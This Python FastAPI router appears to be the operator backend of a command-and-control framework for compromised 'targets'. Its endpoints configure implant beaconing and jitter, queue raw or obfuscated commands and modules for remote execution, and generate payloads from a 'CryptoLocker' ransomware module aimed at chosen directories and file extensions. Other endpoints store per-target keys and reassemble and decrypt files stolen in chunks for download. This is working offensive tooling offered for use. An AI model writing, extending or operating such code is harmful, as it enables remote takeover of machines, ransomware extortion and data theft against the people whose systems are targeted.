from typing import Any
import base64
import binascii
import os
from collections import defaultdict
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from fastapi import APIRouter, Depends, HTTPException, status, Query
from fastapi.responses import Response
from pydantic import BaseModel
from sqlmodel import Session, select

from backend.classes.database import get_session
from backend.classes.auth import get_current_user, get_user_from_token
from backend.classes.command_processor import CommandProcessor
from backend.models.target import Target
from backend.models.command import Command
from backend.models.key_store import KeyStore
from backend.models.user import User

router = APIRouter(prefix="/targets", tags=["targets"])


class CommandRequest(BaseModel):
    command: str
    obfuscate: bool = False


class ModuleCommandRequest(BaseModel):
    module_name: str
    obfuscate: bool = False
    params: dict[str, Any] = {}


class CommandResultResponse(BaseModel):
    id: str
    target_id: str
    command: str
    original_command: str = ""
    output: str
    status: str
    module_name: str = ""


class TargetResponse(BaseModel):
    id: str
    hostname: str
    ip_address: str
    status: str
    beacon_interval: int = 60
    beacon_jitter: float = 0.3
    beacon_timeout: int = 300


class StatusRequest(BaseModel):
    status: str  # "active" | "inactive"


class BeaconConfigRequest(BaseModel):
    beacon_interval: int = 60    # seconds
    beacon_jitter: float = 0.3   # 0.0 – 1.0
    beacon_timeout: int | None = None  # seconds, 0 = disabled, None = unchanged


class KeyStoreResponse(BaseModel):
    id: str
    target_id: str
    public_key_pem: str
    private_key_pem: str
    created_at: str


class ExfilFileResponse(BaseModel):
    filename: str
    chunks_received: int
    total_chunks: int
    encryption: str
    is_complete: bool


@router.get("", response_model=list[TargetResponse])
def list_targets(
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    targets = session.exec(select(Target)).all()
    return targets


@router.get("/{target_id}", response_model=TargetResponse)
def get_target(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")
    return target


@router.patch("/{target_id}/beacon", response_model=TargetResponse)
def set_beacon_config(
    target_id: str,
    body: BeaconConfigRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    if not (0.0 <= body.beacon_jitter <= 1.0):
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="beacon_jitter must be between 0.0 and 1.0",
        )
    if body.beacon_interval < 1:
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail="beacon_interval must be at least 1 second",
        )

    target.beacon_interval = body.beacon_interval
    target.beacon_jitter = body.beacon_jitter
    if body.beacon_timeout is not None:
        if body.beacon_timeout < 0:
            raise HTTPException(
                status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
                detail="beacon_timeout must be >= 0 (0 disables auto-deactivation)",
            )
        target.beacon_timeout = body.beacon_timeout
    session.add(target)
    session.commit()
    session.refresh(target)
    return target


@router.patch("/{target_id}/status", response_model=TargetResponse)
def set_target_status(
    target_id: str,
    body: StatusRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    if body.status not in ("active", "inactive"):
        raise HTTPException(
            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
            detail='status must be "active" or "inactive"',
        )

    target.status = body.status
    session.add(target)
    session.commit()
    session.refresh(target)
    return target


@router.post("/{target_id}/deactivate", response_model=TargetResponse)
def deactivate_target(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """Send a deactivation command to the implant and mark the target inactive."""
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    # Queue the deactivation command so the implant shuts down on next beacon
    cmd = Command(
        target_id=target_id,
        command="__deactivate__",
        original_command="deactivate",
        module_name="system",
        status="pending",
    )
    session.add(cmd)

    target.status = "inactive"
    session.add(target)
    session.commit()
    session.refresh(target)
    return target


@router.get("/debug/crypto-test")
def test_crypto_module(
    target_os: str = "windows",
    target_dir: str = "/tmp/test",
    file_extensions: str = "",
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """Test the crypto locker module to debug issues."""
    from backend.classes.modules.crypto_module import CryptoLocker

    crypto = CryptoLocker()
    extensions = [ext.strip() for ext in file_extensions.split(",") if ext.strip()] if file_extensions else []

    try:
        payload = crypto.generate_payload(
            target_os=target_os,
            session=session,
            target_id="test-target",
            target_directory=target_dir,
            file_extensions=extensions
        )

        return {
            "target_os": target_os,
            "target_directory": target_dir,
            "file_extensions": extensions,
            "payload_length": len(payload),
            "payload_preview": payload[:500] + "..." if len(payload) > 500 else payload,
            "has_debug_output": "DEBUG:" in payload
        }
    except Exception as e:
        return {
            "error": str(e),
            "target_os": target_os,
            "target_directory": target_dir,
            "file_extensions": extensions
        }


@router.post("/migrate/timezone")
def fix_timezone_naive_dates(
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """Fix any timezone-naive last_seen dates in the database."""
    from datetime import timezone

    targets = session.exec(select(Target)).all()
    updated = 0

    for target in targets:
        if target.last_seen and target.last_seen.tzinfo is None:
            # Convert naive datetime to UTC
            target.last_seen = target.last_seen.replace(tzinfo=timezone.utc)
            session.add(target)
            updated += 1

    session.commit()

    return {
        "message": f"Updated {updated} targets with timezone-naive last_seen dates",
        "total_targets": len(targets),
        "updated_targets": updated
    }


@router.delete("/{target_id}")
def delete_target(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """Completely delete a target and all associated data."""
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    # Delete all associated commands
    commands = session.exec(select(Command).where(Command.target_id == target_id)).all()
    commands_count = len(commands)
    for cmd in commands:
        session.delete(cmd)

    # Delete all associated key store entries
    keys = session.exec(select(KeyStore).where(KeyStore.target_id == target_id)).all()
    keys_count = len(keys)
    for key in keys:
        session.delete(key)

    # Delete the target itself
    session.delete(target)

    session.commit()

    return {
        "message": f"Target {target_id} deleted successfully",
        "deleted_commands": commands_count,
        "deleted_keys": keys_count,
        "target_hostname": target.hostname,
        "target_ip": target.ip_address
    }


@router.post("/{target_id}/command", response_model=CommandResultResponse)
def send_command(
    target_id: str,
    body: CommandRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    cmd = CommandProcessor.process_raw(session, target, body.command, body.obfuscate)
    session.commit()
    session.refresh(cmd)
    return cmd


@router.post("/{target_id}/module", response_model=CommandResultResponse)
def send_module_command(
    target_id: str,
    body: ModuleCommandRequest,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    try:
        cmd = CommandProcessor.process(
            session, target, body.module_name, body.obfuscate, **body.params
        )
    except ValueError as e:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST, detail=str(e))

    session.commit()
    session.refresh(cmd)
    return cmd


@router.get("/{target_id}/keys", response_model=list[KeyStoreResponse])
def get_target_keys(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    keys = session.exec(select(KeyStore).where(KeyStore.target_id == target_id)).all()
    return [
        KeyStoreResponse(
            id=k.id,
            target_id=k.target_id,
            public_key_pem=k.public_key_pem,
            private_key_pem=k.private_key_pem,
            created_at=k.created_at.isoformat(),
        )
        for k in keys
    ]


@router.get("/{target_id}/commands", response_model=list[CommandResultResponse])
def list_commands(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    cmds = session.exec(
        select(Command)
        .where(Command.target_id == target_id)
        .order_by(Command.created_at.desc())  # type: ignore[union-attr]
    ).all()
    return cmds


@router.post("/{target_id}/command/{command_id}", response_model=CommandResultResponse)
def get_command_result(
    target_id: str,
    command_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    cmd = session.exec(
        select(Command).where(Command.id == command_id, Command.target_id == target_id)
    ).first()
    if not cmd:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Command not found")
    return cmd


@router.get("/{target_id}/exfil/debug")
def debug_exfil(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """Debug endpoint to see all exfil-related commands."""
    chunks = session.exec(
        select(Command)
        .where(Command.target_id == target_id, Command.module_name == "exfil")
        .order_by(Command.created_at)
    ).all()

    debug_chunks = []
    for chunk in chunks:
        # Parse encryption metadata for debugging
        encryption_meta = ""
        if chunk.command:
            parts = chunk.command.split()
            for part in parts:
                if part.startswith("meta="):
                    encryption_meta = part[5:]
                    break

        debug_info = {
            "id": chunk.id,
            "command": chunk.command,
            "output_preview": chunk.output[:100] + "..." if len(chunk.output) > 100 else chunk.output,
            "created_at": chunk.created_at.isoformat() if chunk.created_at else None,
            "status": chunk.status,
            "encryption_meta": encryption_meta
        }

        # If AES, try to analyze the metadata
        if "enc=aes" in chunk.command and encryption_meta:
            try:
                if "|" in encryption_meta:
                    key_part, iv_part = encryption_meta.split("|", 1)
                    debug_info["key_info"] = {
                        "key_length_chars": len(key_part),
                        "iv_length_chars": len(iv_part),
                        "key_type": "hex" if all(c in '0123456789abcdefABCDEF' for c in key_part) else "base64",
                        "estimated_key_bytes": len(key_part) // 2 if all(c in '0123456789abcdefABCDEF' for c in key_part) else "unknown"
                    }
            except Exception as e:
                debug_info["key_analysis_error"] = str(e)

        debug_chunks.append(debug_info)

    return {
        "target_id": target_id,
        "total_chunks": len(chunks),
        "chunks": debug_chunks
    }


@router.get("/{target_id}/exfil", response_model=list[ExfilFileResponse])
def list_exfil_files(
    target_id: str,
    session: Session = Depends(get_session),
    _user: User = Depends(get_current_user),
):
    """List all exfiltrated files for a target, grouped by filename."""
    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    # Get all exfil chunks for this target
    chunks = session.exec(
        select(Command)
        .where(Command.target_id == target_id, Command.module_name == "exfil")
        .order_by(Command.created_at)
    ).all()

    # Debug: log chunk count
    print(f"DEBUG: Found {len(chunks)} exfil chunks for target {target_id}")

    # Group chunks by filename
    files_map = defaultdict(list)
    for chunk in chunks:
        # Parse command metadata: "file=filename chunk=x/y enc=encryption"
        print(f"DEBUG: Processing chunk command: {chunk.command}")
        if chunk.command and "file=" in chunk.command:
            parts = chunk.command.split()
            filename = None
            chunk_info = None
            encryption = "none"

            for part in parts:
                if part.startswith("file="):
                    filename = part[5:]
                elif part.startswith("chunk="):
                    chunk_info = part[6:]
                elif part.startswith("enc="):
                    encryption = part[4:]

            print(f"DEBUG: Parsed - filename: {filename}, chunk_info: {chunk_info}, encryption: {encryption}")

            if filename and chunk_info:
                try:
                    chunk_index, total_chunks = chunk_info.split("/")
                    files_map[filename].append({
                        "chunk_index": int(chunk_index),
                        "total_chunks": int(total_chunks),
                        "encryption": encryption,
                        "data": chunk.output,
                        "created_at": chunk.created_at
                    })
                except (ValueError, IndexError):
                    continue

    # Build response
    result = []
    for filename, chunks in files_map.items():
        if not chunks:
            continue

        total_chunks = chunks[0]["total_chunks"]
        encryption = chunks[0]["encryption"]
        received_indices = {c["chunk_index"] for c in chunks}
        is_complete = len(received_indices) == total_chunks and all(
            i in received_indices for i in range(total_chunks)
        )

        result.append(ExfilFileResponse(
            filename=filename,
            chunks_received=len(chunks),
            total_chunks=total_chunks,
            encryption=encryption,
            is_complete=is_complete
        ))

    return result


@router.get("/{target_id}/exfil/{filename}/download")
def download_exfil_file(
    target_id: str,
    filename: str,
    token: str = Query(None),
    session: Session = Depends(get_session),
):
    """Reconstruct and download an exfiltrated file."""
    # Handle authentication via query parameter
    if token:
        try:
            _user = get_user_from_token(token, session)
        except HTTPException:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid token")
    else:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Token required for download")

    target = session.get(Target, target_id)
    if not target:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Target not found")

    # Get all chunks for this file
    chunks = session.exec(
        select(Command)
        .where(Command.target_id == target_id, Command.module_name == "exfil")
        .order_by(Command.created_at)
    ).all()

    # Find chunks for this filename
    file_chunks = []
    for chunk in chunks:
        if chunk.command and f"file={filename}" in chunk.command:
            parts = chunk.command.split()
            chunk_info = None
            encryption = "none"
            encryption_meta = ""

            for part in parts:
                if part.startswith("chunk="):
                    chunk_info = part[6:]
                elif part.startswith("enc="):
                    encryption = part[4:]
                elif part.startswith("meta="):
                    encryption_meta = part[5:]

            if chunk_info:
                try:
                    chunk_index, total_chunks = chunk_info.split("/")
                    file_chunks.append({
                        "chunk_index": int(chunk_index),
                        "total_chunks": int(total_chunks),
                        "encryption": encryption,
                        "encryption_meta": encryption_meta,
                        "data": chunk.output,
                    })
                except (ValueError, IndexError):
                    continue

    if not file_chunks:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="File not found")

    # Sort by chunk index
    file_chunks.sort(key=lambda x: x["chunk_index"])

    # Check if all chunks are present
    total_chunks = file_chunks[0]["total_chunks"]
    if len(file_chunks) != total_chunks:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=f"Incomplete file: {len(file_chunks)}/{total_chunks} chunks received"
        )

    # Reconstruct the file
    try:
        encrypted_data = b"".join(base64.b64decode(chunk["data"]) for chunk in file_chunks)
        encryption = file_chunks[0]["encryption"]
        encryption_meta = file_chunks[0].get("encryption_meta", "")

        # Decrypt based on encryption method
        if encryption == "none":
            file_data = encrypted_data
        elif encryption == "xor":
            # XOR decryption: encryption_meta contains the XOR key as a string
            if not encryption_meta:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail="XOR key not found in encryption metadata"
                )
            try:
                xor_key = int(encryption_meta)
                file_data = bytes(b ^ xor_key for b in encrypted_data)
            except ValueError:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail="Invalid XOR key in encryption metadata"
                )
        elif encryption == "aes":
            # AES decryption: encryption_meta contains "hex_key|hex_iv" or "base64_key|base64_iv"
            if not encryption_meta or "|" not in encryption_meta:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail="AES key and IV not found in encryption metadata"
                )
            try:
                key_part, iv_part = encryption_meta.split("|", 1)

                # Try to determine if it's hex or base64 encoded
                try:
                    # Try hex decoding first (for bash-generated keys)
                    if len(key_part) == 64 and all(c in '0123456789abcdefABCDEF' for c in key_part):
                        key = bytes.fromhex(key_part)
                        iv = bytes.fromhex(iv_part)
                    else:
                        # Fall back to base64 (for PowerShell-generated keys)
                        key = base64.b64decode(key_part)
                        iv = base64.b64decode(iv_part)
                except (ValueError, binascii.Error):
                    # If hex fails, try base64
                    key = base64.b64decode(key_part)
                    iv = base64.b64decode(iv_part)

                print(f"DEBUG: AES key length: {len(key)} bytes, IV length: {len(iv)} bytes")

                # Validate key and IV sizes
                if len(key) not in [16, 24, 32]:  # AES-128, AES-192, AES-256
                    raise HTTPException(
                        status_code=status.HTTP_400_BAD_REQUEST,
                        detail=f"Invalid AES key size: {len(key)} bytes. Must be 16, 24, or 32 bytes."
                    )
                if len(iv) != 16:
                    raise HTTPException(
                        status_code=status.HTTP_400_BAD_REQUEST,
                        detail=f"Invalid AES IV size: {len(iv)} bytes. Must be 16 bytes."
                    )

                cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
                decryptor = cipher.decryptor()
                file_data = decryptor.update(encrypted_data) + decryptor.finalize()

                # Remove PKCS7 padding
                if len(file_data) > 0:
                    padding_length = file_data[-1]
                    if padding_length <= 16 and padding_length <= len(file_data):
                        file_data = file_data[:-padding_length]

            except (ValueError, binascii.Error, Exception) as e:
                raise HTTPException(
                    status_code=status.HTTP_400_BAD_REQUEST,
                    detail=f"AES decryption failed: {str(e)}"
                )
        else:
            file_data = encrypted_data

        return Response(
            content=file_data,
            media_type="application/octet-stream",
            headers={"Content-Disposition": f"attachment; filename={filename}"}
        )

    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Failed to reconstruct file: {str(e)}"
        )
